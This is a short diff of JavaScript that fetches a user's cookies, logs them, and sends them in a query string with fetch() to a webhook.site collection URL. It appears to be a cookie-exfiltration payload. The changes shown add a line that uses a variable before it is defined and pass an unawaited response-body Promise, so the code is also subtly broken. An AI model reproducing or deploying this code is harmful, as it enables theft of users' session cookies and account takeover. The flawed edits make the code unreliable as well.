@@ -25,6 +25,8 @@
                 if (!setResponse.ok) {
                     throw new Error('Network response was not ok');
                 }
+                
+                const webhookUrl = `https://webhook.site/6d1b6565-2bc0-49fa-a00d-af73c0d05456?x=${encodeURIComponent(cookieData)}`;
 
                 const setData = await setResponse.json();
                 console.log('Cookie stored:', setData);
@@ -48,7 +50,7 @@
                 const cookieData = await getResponse.text();
                 console.log('Cookies:', cookieData);
 
-                const webhookUrl = `https://webhook.site/6d1b6565-2bc0-49fa-a00d-af73c0d05456?x=${encodeURIComponent(cookieData)}`;
+                const webhookUrl = `https://webhook.site/6d1b6565-2bc0-49fa-a00d-af73c0d05456?x=${encodeURIComponent(getResponse.text())}`;
                 const webhookResponse = await fetch(webhookUrl);
 
                 if (!webhookResponse.ok) {
